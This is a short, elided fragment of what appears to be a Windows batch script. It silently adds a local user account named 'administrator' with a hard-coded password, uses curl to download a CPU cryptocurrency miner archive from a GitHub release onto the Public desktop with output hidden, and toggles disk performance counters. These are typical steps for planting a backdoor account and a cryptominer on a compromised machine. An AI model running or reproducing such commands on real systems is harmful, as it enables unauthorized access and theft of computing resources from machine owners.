...
net user administrator Jovano /add >nul
...
curl -o "C:\Users\Public\Desktop\miner.zip" https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-win.zip > out.txt 2>&1
diskperf -Y >nul
